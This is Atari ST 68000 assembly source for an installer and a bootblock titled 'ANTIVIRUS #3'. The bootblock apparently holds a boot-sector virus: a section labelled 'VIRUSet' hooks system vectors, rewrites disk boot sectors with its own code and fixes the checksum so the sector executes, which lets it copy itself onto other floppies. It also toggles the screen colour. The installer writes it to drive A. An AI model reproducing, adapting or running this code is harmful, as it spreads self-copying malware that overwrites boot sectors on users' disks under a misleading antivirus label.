                opt P+
                lea     B(pc),a6
                bsr.s   KILLVIRUS
                clr.w   -(a7)
                trap    #1

                >PART 'Kill Virus'
*******************************************
**      KILL VIRUS
*******************************************
KILLVIRUS:      bsr.s   COUNT_CHECK
                lea     AREA2(pc),a0
                bsr.s   SAVEBOOT
                rts
                endpart
                >PART 'Save A0 on Boot sector'
SAVEBOOT:       move.w  #1,-(a7)        ; ONE SECTOR
                move.w  #0,-(a7)        ; SIDE 0
                move.w  #0,-(a7)        ; START AT TRACK 0
                move.w  #1,-(a7)        ; START AT SECTOR 1
                move.w  #0,-(a7)        ; DRIVE A
                clr.l   -(a7)           ; POINTLESS
                move.l  a0,-(a7)
                move.w  #9,-(a7)
                trap    #14
                lea     20(a7),a7
                tst.l   d0
                bmi.s   ERROR
                rts

*****************************
ERROR:          illegal
                rts
                endpart
                >PART 'COUNT CHECKSUM'
****************************************
**      COUNT CHECKSUM & LOAD DOS INFO
****************************************
COUNT_CHECK:
                bsr.s   LADDABOOTBLOCK
                movea.l a6,a0
                lea     AREA2(pc),a1
                moveq   #127,d0
COPA:           move.l  (a0)+,(a1)+
                dbra    d0,COPA

                lea     AREA2+11(pc),a0
                lea     AREA1+11(pc),a1
                moveq   #18,d0
DONT_DESTROY:
                move.b  (a1)+,(a0)+
                dbra    d0,DONT_DESTROY
                lea     AREA2(pc),a0
                moveq   #0,d7
                move.w  #255,d0
COUNT2:         add.w   (a0)+,d7
                dbra    d0,COUNT2
                move.w  #$1234,d5
                sub.w   d7,d5
                lea     AREA2+8(pc),a0
                move.w  d5,(a0)
                rts

                endpart
                >PART 'LOAD BOOTBLOCK'
*******************************************
**      LOAD BOOT BLOCK
*******************************************
LADDABOOTBLOCK: move.w  #1,-(a7)        ; ONE SECTOR
                move.w  #0,-(a7)        ; SIDE 0
                move.w  #0,-(a7)        ; START AT TRACK 0
                move.w  #1,-(a7)        ; START AT SECTOR 1
                move.w  #0,-(a7)        ; DRIVE A
                clr.l   -(a7)           ; POINTLESS
                pea     AREA1(pc)
                move.w  #8,-(a7)
                trap    #14
                lea     20(a7),a7
                rts
                endpart

AREA1:          ds.w 256
AREA2:          ds.w 256

*********************  THE BOOTBLOCK ///


                PART 'ANTIVIRUS  #3'

B:              bra.s   Start           ;0-1    BRANCH INSTRUCTION
                dc.b "sucker"   ;2-7    LOADER
                dc.b $00,$00,$00 ;8-10   SERIAL NUMBER  (CHECKSUM..)
                dc.b $00,$02    ;11-12  BYTES PER SECTOR
                dc.b $02        ;13     SECTORS PER CLUSTER
                dc.b $01,$00    ;14-15  NUMBER OF RESERVED SECTORS
                dc.b $02        ;16     FILE ALOCATIONS ON DISC
                dc.b $70,$00    ;17-18  NUMBER OF DIRECTORY ENTRIES
                dc.b $A0,$05    ;19-20  SECTROS ON DISC
                dc.b $F9        ;21     MEDIA DESCRIPTOR BYTE, NOT USED BY ST-BIOS
                dc.b $05,$00    ;22-23  NUMBER OF SECTORS IN EACH FAT
                dc.b $09,$00    ;24-25  NUMBER OF SECTORS PER TRACK
                dc.b $02,$00    ;26-27  NUMBER OF SIDES ON DISC
                dc.b $00,$00    ;28-29  NUMBER OF HIDEDEN SECTORS
                even
************************************
**      INIT BOOT
************************************
Start:          movem.l d0-a6,-(a7)
                move.l  a7,$0426.w

Counter:        pea     1024.w          ; Reserve Memory
                move.w  #$48,-(a7)
                trap    #1

                lea     B(pc),a0
                movea.l d0,a5
                lea     GetThere-B(a5),a6
                moveq   #127,d7
.Kopa:          move.l  (a0)+,(a5)+
                dbra    d7,.Kopa
                jmp     (a6)

                dc.b "Ragnar³k89"
**********************************************************
**      ENDUP HERE AFTER COPYING INTO RESERVED MEM
**********************************************************
GetThere:       lea     Vect4C6(pc),a0
                move.l  a0,$04C6.w
                move.l  $04BA.w,2(a0)
                addi.l  #45*50,2(a0)

                movea.l $0426.w,a7
                movem.l (a7)+,d0-a6
                rts

**********************************************************
**      VIRUSet
**********************************************************
Vect4C6:        cmpi.l  #0,$04BA.w
                blo.s   .Sture
*                clr.l   $04C6.w
                lea     SlutMem(pc),a6
                move.l  $88.w,(a6)      ; Start Trap 2
                lea     Trap2(pc),a6
*                move.l  a6,$88.w
.Sture:         not.w   $FFFF8240.w
                rts

Trap2:          movem.l d0-a6,-(a7)
                lea     B(pc),a6
                move.l  $0472.w,Hoppa+2-B(a6)
                lea     Vect472(pc),a0
                move.l  a0,$0472.w
                move.l  SlutMem-B(pc),$88.w
                movem.l (a7)+,d0-a6
                trap    #2
                movem.l d0-a6,-(a7)
                lea     B(pc),a6
                move.l  Hoppa+2-B(pc),$0472.w
                lea     Trap2(pc),a0
                move.l  a0,$88.w
                movem.l (a7)+,d0-a6
                rte


Vect472:        movem.l d0-a6,-(a7)
                lea     B(pc),a6

                eori.w  #$0707,$FFFF8240.w
                movea.l $047A.w,a0
                jsr     (a0)
                movea.w $04C6.w,a5
                tst.w   d0
                beq.s   .Executable


                addq.w  #2,Counter+2-B(a6)
                lea     B+11(pc),a4     ; FIX A NEW BOOTBLOCK IN MEM
                lea     11(a5),a5
                moveq   #18,d0
.CopyHeader:    move.b  (a5)+,(a4)+
                dbra    d0,.CopyHeader
                lea     -30(a4),a4
                clr.w   8(a4)
                move.w  #255,d0
                moveq   #0,d1
.CheckSum:      add.w   (a4)+,d1
                dbra    d0,.CheckSum
                move.w  #$1234,d0
                sub.w   d1,d0
                move.w  d0,-504(a4)

                pea     $01             ; TRACK 0 SECTOR 1
                pea     $010000
                move.w  #0,-(a7)        ; DRIVE A
                clr.l   -(a7)           ; POINTLESS
                pea     B(pc)
                move.w  #9,-(a7)
                trap    #14
                lea     20(a7),a7

.Executable:    movem.l (a7)+,d0-a6
Hoppa:          jmp     $FFFFFF

SlutMem:
AV_SIZE         equ SlutMem-B
                ds.b 512-AV_SIZE ; BETTER BE SURE

                if AV_SIZE>512
                fail
                endc

                endpart
                end
